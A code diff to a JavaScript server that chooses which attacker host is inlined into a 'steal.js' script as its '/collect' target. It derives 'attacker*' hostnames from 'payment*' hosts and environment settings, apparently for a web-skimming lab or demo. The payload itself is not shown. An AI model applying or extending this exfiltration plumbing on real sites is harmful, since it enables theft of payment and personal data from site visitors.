@@ -22,6 +22,27 @@ function forwardedHost(req) {
   return raw.split(',')[0].trim();
 }
 
+function hostFirstLabel(host) {
+  if (!host) return '';
+  return host.split(',')[0].trim().split(':')[0].split('.')[0];
+}
+
+/** payment / payment1 / payment2 → attacker / attacker1 / attacker2 (+ same suffix). */
+function deriveAttackerHost(paymentHost) {
+  if (!paymentHost) return '';
+  const host = paymentHost.split(',')[0].trim().split(':')[0];
+  const dot = host.indexOf('.');
+  const label = dot === -1 ? host : host.slice(0, dot);
+  const suffix = dot === -1 ? '' : host.slice(dot);
+  const match = label.match(/^payment(\d*)$/i);
+  if (!match) return '';
+  return `attacker${match[1]}${suffix}`;
+}
+
+function isAttackerHost(host) {
+  return /^attacker\d*$/i.test(hostFirstLabel(host));
+}
+
 function normalizeLegacyOrigin(legacy) {
   const href = /^https?:\/\//i.test(legacy) ? legacy : `https://${legacy}`;
   try {
@@ -49,25 +70,28 @@ function buildProtocolRelativeBase(hostRaw) {
 }
 
 /**
- * Origin baked into steal.js for `/collect`:
- * Prefer PAYMENT_DOMAIN (payment.* → attacker.*) before Host or ATTACKER_DOMAIN,
- * so a stale Host (e.g. old VIP hostname) does not skew the inlined target.
+ * Host baked into steal.js for `/collect`:
+ * prefer request Host (attacker* vhost or payment* → attacker*), then PAYMENT_DOMAIN, ATTACKER_DOMAIN.
  * Set FORCE_ATTACKER_URL_FROM_ENV=1 with ATTACKER_URL to bake a fixed origin.
  */
 function resolveStealJsTargetHost(req) {
   const cfgPay = (process.env.PAYMENT_DOMAIN || '').trim();
   const explicit = (process.env.ATTACKER_DOMAIN || '').trim();
   const fwd = forwardedHost(req);
+  const fwdHost = fwd ? fwd.split(':')[0] : '';
 
-  if (cfgPay.startsWith('payment.')) {
-    return `attacker.${cfgPay.slice('payment.'.length)}`;
+  if (fwdHost && isAttackerHost(fwdHost)) {
+    return fwdHost;
   }
-  if (explicit) {
-    return explicit;
-  }
-  if (fwd) {
-    return fwd;
-  }
+
+  const fromRequest = deriveAttackerHost(fwd);
+  if (fromRequest) return fromRequest;
+
+  const fromCfg = deriveAttackerHost(cfgPay);
+  if (fromCfg) return fromCfg;
+
+  if (explicit) return explicit;
+  if (fwdHost) return fwdHost;
   return '';
 }
 
